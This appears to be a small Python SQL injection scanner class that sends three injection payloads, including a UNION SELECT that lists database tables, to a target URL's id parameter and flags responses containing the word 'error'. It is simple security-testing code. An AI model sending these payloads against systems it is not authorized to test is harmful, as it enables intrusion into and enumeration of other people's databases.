import requests

class SQLiDetector:
    def __init__(self, target_url):
        self.target = target_url
        self.payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' UNION SELECT null,table_name FROM information_schema.tables--"
        ]
    
    def scan(self):
        results = []
        for payload in self.payloads:
            try:
                response = requests.get(f"{self.target}?id={payload}")
                if "error" in response.text.lower():
                    results.append({
                        'type': 'SQLi',
                        'payload': payload,
                        'url': self.target
                    })
            except:
                continue
        return results